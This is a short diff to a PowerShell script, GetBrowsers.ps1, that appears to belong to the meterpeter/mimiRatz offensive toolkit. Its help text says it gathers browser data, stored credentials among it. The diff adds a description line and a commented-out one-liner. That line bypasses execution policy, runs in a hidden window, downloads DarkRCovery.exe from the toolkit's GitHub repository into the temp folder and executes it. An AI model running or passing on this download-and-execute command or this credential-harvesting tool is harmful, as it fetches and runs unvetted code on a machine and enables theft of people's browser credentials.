@@ -12,6 +12,7 @@
    Browsers Version, Accepted Language, Download Directory, History, Bookmarks, Extentions,
    StartPage, Stored Creds, Etc. The leaks will be saved to $env:TMP folder and Auto-deleted
    in the end. Unless the 2º argument is used to input the Logfile permanent storage location.
+   'This script was written to enumerate the browsers installed under Microsoft systems'
 
 .NOTES
    PS C:\> Get-Help ./GetBrowsers.ps1 -full
@@ -74,6 +75,7 @@
     https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/mozlz4-win32.exe
 #>
 
+# powershell -executionpolicy bypass -w 1 -command (New-Object System.Net.WebClient).DownloadFile("https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/DarkRCovery.exe","$env:tmp\DarkRCovery.exe");(New-Object -com Shell.Application).ShellExecute("$env:tmp\DarkRCovery.exe")
 
 # param (
 #  [Parameter(Mandatory=$true,Position=0)]$IE,
